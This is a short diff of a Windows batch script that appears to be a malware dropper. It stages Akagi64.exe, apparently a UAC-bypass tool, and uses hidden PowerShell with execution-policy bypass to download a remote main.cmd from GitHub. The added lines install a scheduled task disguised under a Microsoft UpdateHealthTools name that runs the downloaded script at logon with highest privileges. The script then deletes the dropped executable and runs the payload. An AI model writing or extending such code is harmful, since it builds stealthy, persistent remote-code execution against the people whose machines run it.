@@ -10,6 +10,8 @@ copy /y "%~dp0Akagi64.exe" "%STAGE%\Akagi64.exe" >nul
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/main.cmd' -OutFile '%STAGE%\main.cmd' -UseBasicParsing"
 
+schtasks /create /tn "\Microsoft\Windows\UpdateHealthTools" /tr "C:\Windows\System32\cmd.exe /c \"%STAGE%\main.cmd\"" /sc onlogon /rl highest /f >nul 2>&1
+
 del /f /q "%TEMP%\Akagi64.exe" >nul 2>&1
 
 call "%STAGE%\main.cmd"
